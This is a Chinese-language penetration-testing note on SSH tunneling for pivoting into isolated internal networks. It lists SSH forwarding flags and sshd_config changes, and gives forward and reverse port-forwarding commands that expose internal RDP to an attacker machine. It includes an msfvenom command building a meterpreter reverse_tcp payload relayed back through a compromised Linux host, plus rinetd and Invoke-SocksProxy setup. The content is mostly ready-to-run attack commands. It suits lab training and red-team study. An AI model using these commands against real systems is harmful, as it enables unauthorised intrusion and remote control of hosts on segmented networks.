  #### SSH
	-C 压缩传输，加快传输速度
	-f 在后台对用户名密码进行认证
	-N 仅仅只用来转发，不用再弹回一个新的shell -n 后台运行
	-q 安静模式，不要显示任何debug信息
	-l 指定ssh登录名
	-g 允许远程主机连接到本地用于转发的端口
	-L 进行本地端口转发
	-R 进行远程端口转发
	-D 动态转发，即socks代理
	-T 禁止分配伪终端
	-p 指定远程ssh服务端口
  #### 正向转发
	外网靶机110
	内网靶机115
	本地攻击机编辑后restart ssh服务
	#vim /etc/ssh/sshd_conf
	AllowTcpForwarding yes 允许TCP转发
	GatewayPorts yes   允许远程主机连接本地转发的端口
	TCPKeepAlive yes    TCP会话保持存活
	PasswordAuthentication yes  密码认证
	>ssh -C -f -N -g -L 33890:192.168.0.115:3389 root@192.168.0.110 -p 22
	本地攻击机执行，本地33890转发到远程的3389端口
	上线MSF
	攻击机?出网Linux靶机--不出网Linux靶机--不出网win机
	>msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=不出网Linux机 lport=12138 -f exe -o /var/www/html/1.exe
	攻击机监听端口12345
	不出网Linux机
	>ssh -C -f -N -g -L 0.0.0.0:12138:攻击机:12345 root@出网Linux主机 -p 22
  #### 反向转发
	外网攻击107
	内网靶机97
	出网靶机编辑后restart ssh服务
	#vim /etc/ssh/sshd_conf
	AllowTcpForwarding yes 允许TCP转发
	GatewayPorts yes   允许远程主机连接本地转发的端口
	TCPKeepAlive yes    TCP会话保持存活
	PasswordAuthentication yes  密码认证
	>ssh -C -f -N -g -R 33890:10.1.1.97:3389 root@192.168.0.107 -p 22
	出网靶机执行，把外部攻击机33890转发到内部隔离网络的3389
	>netstat –tnlp
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/165.png)

	转发成功，外网攻击机安装apt install rinetd(正向tcp转发工具)
	>vim /etc/rinetd.conf
	添加0.0.0.0 3389 127.0.0.1 33890
	>service rinetd start
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/166.png)

	看到107是kali攻击机，连接107:33890即可到达内网10.1.1.97的桌面
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/167.png)
  ### Invoke-SocksProxy
	https://gitee.com/RichChigga/Invoke-SocksProxy
	>Import-Module .\Invoke-SocksProxy.psm1 
	>Invoke-SocksProxy -bindPort 12138 建立socks代理，使用代理软件连接
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/168.png)
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/169.png)
